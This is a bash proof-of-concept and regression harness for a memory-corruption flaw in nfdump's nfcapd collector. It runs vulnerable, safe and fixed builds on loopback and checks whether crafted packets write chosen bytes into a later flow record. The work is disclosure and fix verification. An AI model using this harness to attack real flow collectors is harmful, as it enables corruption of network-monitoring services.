#!/usr/bin/env bash
# nfdump2shell: live loopback proof that the pinned truncated-EXgenericFlow
# ICMP swap writes packet-chosen bytes into a LATER, processed V3 record.
# Runs ASan and plain vulnerable collectors plus a safe and a fixed control.
set -u
cd "$(dirname "$0")"
V=${V_BUILD:-src/build-vuln-asan/src}
F=${F_BUILD:-src/build-fixed-asan/src}
VP=${V_PLAIN:-src/build-vuln-plain/src}
OUT=${ALIAS_OUT:-harness/out/alias}
if [ ! -x "$V/nfcapd/nfcapd" ] || [ ! -x "$F/nfcapd/nfcapd" ] || [ ! -x "$VP/nfcapd/nfcapd" ]; then
    bash build-wire.sh || exit 2
fi
mkdir -p "$OUT"

PASS=0; FAIL=0
ok()  { printf 'PASS %s\n' "$1"; PASS=$((PASS+1)); }
bad() { printf 'FAIL %s\n' "$1"; FAIL=$((FAIL+1)); }
need() { # FILE PATTERN LABEL
    if grep -q "$2" "$1" 2>/dev/null; then ok "$3"; else bad "$3"; fi
}
none() { # FILE PATTERN LABEL
    if grep -q "$2" "$1" 2>/dev/null; then bad "$3"; else ok "$3"; fi
}

run_case() { # LABEL BUILD PORT MODE
    local label=$1 build=$2 port=$3 mode=$4
    local dir="$OUT/$label"
    rm -rf "$dir"; mkdir -p "$dir/flows"
    ASAN_OPTIONS=detect_leaks=0 "$build/nfcapd/nfcapd" \
        -4 -b 127.0.0.1 -p "$port" -M "$dir/flows" -t 5 >"$dir/daemon.log" 2>&1 &
    local pid=$!
    sleep 1
    python3 harness/wire_send.py "$port" "$mode" >"$dir/sender.log" 2>&1
    sleep 1
    kill -TERM "$pid" 2>/dev/null || true
    wait "$pid" 2>/dev/null || true
    local cap
    cap=$(find "$dir/flows" -type f | sort | head -1)
    LAST_READBACK="NONE"
    if [ -n "$cap" ]; then
        LAST_READBACK=$(python3 harness/alias_readback.py "$cap" 2>&1)
        ASAN_OPTIONS=detect_leaks=0 "$build/nfdump/nfdump" -r "$cap" \
            -o 'fmt:%ts|%sp|%dp|%pr|%pkt|%byt' >"$dir/flows.txt" 2>&1 || true
    fi
    printf '%s\n' "$LAST_READBACK" >"$dir/readback.txt"
    echo "=== $label mode=$mode ==="
    head -1 "$dir/sender.log"
    cat "$dir/readback.txt"
    grep -E 'Corrupt nfd record|record size error|ERROR: AddressSanitizer' "$dir/daemon.log" || true
    grep -E '^Summary: total flows' "$dir/flows.txt" 2>/dev/null || true
}

run_case vuln-alias-asan "$V" 10101 alias; D="$OUT/vuln-alias-asan"
need "$D/sender.log" 'WIRE_LEN=120' 'alias: 120-byte two-record datagram'
need "$D/readback.txt" 'REC2_MSECFIRST=0000123401000000' 'asan vuln: chosen swap bytes in processed record 2'
need "$D/flows.txt" 'total flows: 2' 'asan vuln: two flows written'
none "$D/daemon.log" 'ERROR: AddressSanitizer' 'asan vuln: no report in 64 KiB buffer'

run_case vuln-alias-plain "$VP" 10102 alias; D="$OUT/vuln-alias-plain"
need "$D/readback.txt" 'REC2_MSECFIRST=0000123401000000' 'plain vuln: same chosen bytes without ASan'
need "$D/flows.txt" 'total flows: 2' 'plain vuln: two flows written'

run_case vuln-alias-safe "$V" 10103 alias-safe; D="$OUT/vuln-alias-safe"
need "$D/readback.txt" 'REC2_MSECFIRST=3412000001000000' 'safe: no swap into processed record 2'
need "$D/flows.txt" 'total flows: 2' 'safe: two flows written'

run_case fixed-alias "$F" 10104 alias; D="$OUT/fixed-alias"
need "$D/daemon.log" 'Corrupt nfd record: expected 2 records, processd: 0' 'fixed: short element rejected live'
need "$D/flows.txt" 'total flows: 0' 'fixed: no flow written'
need "$D/readback.txt" 'REC2_FOUND=0' 'fixed: no processed record 2'

printf 'TOTAL: %d PASS / %d FAIL\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
